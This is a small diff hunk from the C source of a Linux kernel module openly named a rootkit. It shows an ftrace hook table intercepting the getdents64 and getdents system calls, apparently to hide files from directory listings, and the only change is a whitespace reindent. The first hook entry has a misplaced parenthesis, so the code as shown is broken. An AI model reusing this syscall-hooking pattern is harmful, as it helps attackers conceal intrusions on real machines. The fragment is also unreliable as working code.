@@ -120,7 +120,7 @@ done:
 }
 
 static struct ftrace_hook hooks[] = {HOOK("__x64_sys_getdents64"), hook_getdents64, &orig_getdents64, 
-									 HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),};
+				     HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),};
 
 static int __init rootkit_init(void)
 {
